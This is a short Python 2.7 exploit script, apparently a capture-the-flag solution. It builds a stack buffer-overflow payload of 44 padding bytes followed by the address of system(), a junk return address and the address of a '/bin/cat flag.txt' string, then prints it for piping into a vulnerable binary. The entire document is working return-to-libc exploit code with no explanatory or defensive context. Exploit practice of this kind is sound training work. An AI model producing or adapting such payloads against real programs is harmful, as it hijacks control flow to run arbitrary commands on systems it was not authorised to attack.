#!/usr/bin/python2.7
import struct
x=lambda a:struct.pack('<I', a)
payload = 'D'*44
payload += x(0x8048430) # address of system()
payload += 'BBBB' # junk
payload += x(0x0804a030) # Address of '/bin/cat flag.txt'
print payload

